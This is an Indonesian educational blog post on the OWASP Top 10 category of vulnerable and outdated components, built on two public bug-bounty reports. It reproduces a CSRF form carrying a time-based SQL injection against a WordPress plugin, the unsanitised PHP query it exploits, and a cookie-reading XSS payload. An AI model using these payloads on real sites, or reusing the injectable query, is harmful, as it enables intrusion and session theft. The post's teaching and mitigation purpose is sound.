---
title: "Owasp Top 10 Series — A6 (Vulnerable and Outdated Components)"
date: 2022-05-07T18:45:34+07:00
tags: ["security"]
categories: ["Owasp Top Ten"]
thumbnail: "/icon/owasp.svg"
---

## Pengantar

Artikel kali ini kita akan membahas owasp top 10 yang ada di urutan ke enam untuk tahun 2021 (owasp tiap 4 tahun sekali), ialah **Vulnerable and Outdated Components**.

OWASP merupakan singkatan dari _Open Web Application Security Project_, yang merupakan sebuah project _Security Web Application_ open source yang diperkasai oleh para penggiat teknologi atau pengembang aplikasi, OWASP sering mengadakan seminar, forum diskusi serta pendidikan untuk para Developer.

jadi yang dimaksud **OWASP TOP 10**? owasp top 10 merupakan sebuah cara untuk mengkategorikan resiko kerentanan yang sering terjadi pada sebuah aplikasi berbasis website, dari yang paling atas (resiko tertinggi) hingga yang paling bawah (tingkat resiko rendah), Tujuannya apa ?, tentu saja ini sangat berguna bagi para developer aplikasi supaya mereka jadi lebih aware terhadap kerentanan di aplikasi mereka.

## Vulnerable and Outdated Components

### apa itu Vulnerable and Outdated Components ?

**Vulnerable and Outdated Components** Merupakan sebuah kesalahan dari developer aplikasi yang memakai **Framework / Library** pihak ketiga tetapi masih versi lawas (Outdated), karena biasanya versi Outdate itu sangat rentan terhadadp serangan.

Ironisnya **Vulnerable and Outdated Components** ini sering terjadi di Indonesia :'(, apalagi situs situs yang tidak di maintenance dengan baik dan terbengkalai sehingga attacker dapat menggunakan kerentanan aplikasi itu.

## Praktikal

### #135288 Multiple vulnerabilities in a WordPress plugin at drive.uber.com

sumber : https://hackerone.com/reports/135288

attacker melakukan scanning di website **drive.uber.com** dan menemukan bahwa aplikasi tersebut masih menggunakan _WordPress 4.4.2_ (versi lawas).

dari \*WordPress 4.4.2\*\* ditemukan beberapa kerentanan seperti :

1. SQL INJECTION

attacker membuat sebuah halaman seperti berikut

```
<form action="https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder" target="_blank"  method="post" style="display: none;">
            <input type="text" name="btnOrderPages" value="Click to Reorder FAQs" />
            <input type="text" name="hdnfaqpageorder" value="id_8,id_7" />
            <input type="text" name="hdnParentID" value="IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)" />
            <input type="text" name="btnReturnParent" value="1" />
            <input type="submit" name="send" value="Save" />
</form>
<script type="text/javascript">
document.forms[0].submit();
</script>
```

POST di _plugins/q-and-a/inc/reorder.php_

```
45. if (isset($_POST['btnReturnParent'])) {
46. 	$parentsParent = $wpdb->get_row("SELECT post_parent FROM $wpdb->posts WHERE ID = " . $_POST['hdnParentID'], ARRAY_N);
47. 	$parentID = $parentsParent[0];
48. }
```

2. Cross-Site Scripting (XSS)

Attacker Login ke _admin panel_ -> _Settings_ -> _Q & A_

ganti FAQ Homepage :

```
'"/autofocus/onfocus=alert(document.domain%2bdocument.cookie);//
```

### #168485 Exposed, outdated nginx server (v1.4.6) potentially vulnerable to heap-based buffer overflow & RCE

sumber : https://hackerone.com/reports/168485

attacker melakukan **recon** do ip address _54.153.101.52_ dan mendapati bahwa masih menggunakan **nginx version 1.4.6**

[CVE-2014-0133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0133)

CVE diatas terdapat kerentanan **RCE**

![Hackerone CVE 2014 0133](https://drive.google.com/uc?id=1LTMAZjEVU2YZZ01u-CIsWqeZWQvhXcCH)

## Mitigasi

Segera lakukan pengecekan berkala di aplikasi yang anda gunakan, jika memang memakai pihak ketiga (Framework) dari developer lain. usahakan selalu memakai versi yang paling update untuk meredam resiku peretasan.

## References

OWASP Application Security Verification Standard: V1 Architecture, design and threat modelling

OWASP Dependency Check (for Java and .NET libraries)

OWASP Testing Guide - Map Application Architecture (OTG-INFO-010)

OWASP Virtual Patching Best Practices

The Unfortunate Reality of Insecure Libraries

MITRE Common Vulnerabilities and Exposures (CVE) search

National Vulnerability Database (NVD)

Retire.js for detecting known vulnerable JavaScript libraries

Node Libraries Security Advisories

Ruby Libraries Security Advisory Database and Tools

```
https://safecode.org/publication/SAFECode_Software_Integrity_Controls0610.pdf
```

# Beberapa kerentanan lain di list CWE

CWE-937 OWASP Top 10 2013: Using Components with Known Vulnerabilities

CWE-1035 2017 Top 10 A9: Using Components with Known Vulnerabilities

CWE-1104 Use of Unmaintained Third Party Components
